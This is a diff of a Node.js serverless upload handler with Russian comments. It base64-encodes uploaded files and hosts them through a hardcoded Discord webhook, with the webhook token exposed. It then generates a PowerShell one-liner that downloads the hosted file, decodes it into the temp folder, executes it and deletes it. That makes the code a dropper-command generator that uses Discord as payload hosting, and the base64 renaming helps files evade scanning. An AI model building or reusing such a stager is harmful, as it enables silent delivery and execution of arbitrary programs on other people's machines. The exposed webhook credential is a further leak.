@@ -2,59 +2,26 @@ const https = require('https');
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';
 
-// ВАЖНО: Отключаем bodyParser для прямой работы с данными
+// Отключаем bodyParser для Vercel
 module.exports.config = {
   api: {
     bodyParser: false,
   },
 };
 
-function parseMultipart(data, boundary) {
-  const parts = [];
-  const boundaryBuffer = Buffer.from('--' + boundary);
-  let start = 0;
-
-  while (true) {
-    start = data.indexOf(boundaryBuffer, start);
-    if (start === -1) break;
-    start += boundaryBuffer.length;
-
-    let end = data.indexOf(boundaryBuffer, start);
-    if (end === -1) break;
-
-    const part = data.slice(start, end);
-    const headerEnd = part.indexOf('\r\n\r\n');
-    if (headerEnd !== -1) {
-      const headers = part.slice(0, headerEnd).toString();
-      const content = part.slice(headerEnd + 4, part.length - 2);
-      
-      const nameMatch = headers.match(/name="([^"]+)"/);
-      const filenameMatch = headers.match(/filename="([^"]+)"/);
-      
-      if (nameMatch && nameMatch[1] === 'fileToUpload') {
-        parts.push({
-          filename: filenameMatch ? filenameMatch[1] : 'file.bin',
-          content: content
-        });
-      }
-    }
-    start = end;
-  }
-  return parts;
-}
-
-async function uploadToDiscord(content, filename) {
-  const base64 = content.toString('base64');
-  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
-  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
-  
-  const payload = Buffer.concat([
-    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
-    Buffer.from(base64),
-    Buffer.from(`\r\n--${boundary}--\r\n`)
-  ]);
-
+// Функция для отправки данных в Discord (как файл)
+function uploadFileToDiscord(buffer, filename) {
   return new Promise((resolve, reject) => {
+    const base64Content = buffer.toString('base64');
+    const encodedFilename = filename.replace(/\.[^/.]+$/, '') + '.b64';
+    const boundary = '----Boundary' + Math.random().toString(36).substring(2);
+    
+    const payload = Buffer.concat([
+      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`),
+      Buffer.from(base64Content),
+      Buffer.from(`\r\n--${boundary}--\r\n`)
+    ]);
+
     const url = new URL(DISCORD_WEBHOOK);
     const req = https.request({
       hostname: url.hostname,
@@ -65,18 +32,36 @@ async function uploadToDiscord(content, filename) {
         'Content-Length': payload.length
       }
     }, res => {
-      let resData = '';
-      res.on('data', chunk => resData += chunk);
+      let data = '';
+      res.on('data', chunk => data += chunk);
       res.on('end', () => {
         try {
-          const json = JSON.parse(resData);
+          const json = JSON.parse(data);
           if (json.attachments?.[0]?.url) resolve({ url: json.attachments[0].url, name: filename });
-          else reject(new Error('Discord Error: ' + resData));
-        } catch (e) { resolve({ url: 'ERROR', name: filename, raw: resData }); }
+          else reject(new Error('Discord error: ' + data));
+        } catch (e) { reject(new Error('Invalid JSON from Discord: ' + data)); }
       });
     });
+
     req.on('error', reject);
     req.write(payload);
+    req.end();
+  });
+}
+
+// Функция для отправки текстового сообщения в Discord
+function sendMessageToDiscord(content) {
+  return new Promise((resolve) => {
+    const data = JSON.stringify({ content });
+    const req = https.request(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
+    }, res => {
+      res.on('data', () => {});
+      res.on('end', resolve);
+    });
+    req.on('error', () => resolve()); // Игнорируем ошибки лога
+    req.write(data);
     req.end();
   });
 }
@@ -91,48 +76,42 @@ module.exports = async (req, res) => {
   try {
     const contentType = req.headers['content-type'] || '';
     const boundaryMatch = contentType.match(/boundary=([^;]+)/);
-    if (!boundaryMatch) return res.status(400).json({ success: false, error: 'No boundary' });
-    const boundary = boundaryMatch[1];
+    if (!boundaryMatch) throw new Error('Request has no boundary');
+    const boundary = Buffer.from('--' + boundaryMatch[1]);
 
+    // Читаем все данные в один буфер
     const chunks = [];
     for await (const chunk of req) chunks.push(chunk);
-    const buffer = Buffer.concat(chunks);
+    const body = Buffer.concat(chunks);
+
+    if (body.length === 0) throw new Error('Body is empty');
+
+    // Простейший парсинг одного файла (для надежности на Vercel)
+    const fileStart = body.indexOf(Buffer.from('\r\n\r\n')) + 4;
+    const fileEnd = body.lastIndexOf(boundary) - 2;
     
-    if (buffer.length === 0) return res.status(400).json({ success: false, error: 'Empty body' });
+    // Ищем имя файла
+    const headerPart = body.slice(0, fileStart).toString();
+    const filenameMatch = headerPart.match(/filename="([^"]+)"/);
+    const filename = filenameMatch ? filenameMatch[1] : 'file.bin';
 
-    const files = parseMultipart(buffer, boundary);
-    if (files.length === 0) return res.status(400).json({ success: false, error: 'No files parsed' });
+    if (fileEnd <= fileStart) throw new Error('Could not parse file data');
 
-    const results = [];
-    for (const f of files) {
-      const uploaded = await uploadToDiscord(f.content, f.filename);
-      results.push(uploaded);
-    }
+    const fileBuffer = body.slice(fileStart, fileEnd);
 
-    let cmd = '';
-    if (results.length === 1) {
-      cmd = `powershell -c "$t=\\"$env:TEMP\\${results[0].name}\\";$u='${results[0].url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
-    } else {
-      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
-      results.forEach((r, i) => {
-        const idx = i + 1;
-        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
-        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
-        startParts.push(`Start-Process $t${idx} -Wait`);
-        tVars.push(`$t${idx}`);
-      });
-      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
-    }
+    // Загружаем в Discord
+    const uploaded = await uploadFileToDiscord(fileBuffer, filename);
 
-    // Сообщение в Discord
-    const whReq = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
-    whReq.write(JSON.stringify({ content: `📁 **${results.map(r=>r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\`` }));
-    whReq.end();
+    // Команда PowerShell
+    const cmd = `powershell -c "$t=\\"$env:TEMP\\${uploaded.name}\\";$u='${uploaded.url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
+
+    // Отправляем лог в Discord и ЖДЕМ завершения
+    await sendMessageToDiscord(`📁 **${uploaded.name}**\n\`\`\`powershell\n${cmd}\n\`\`\``);
 
     return res.status(200).json({ success: true, command: cmd });
 
   } catch (err) {
-    console.error(err);
+    console.error('SERVER ERROR:', err.message);
     return res.status(500).json({ success: false, error: err.message });
   }
 };
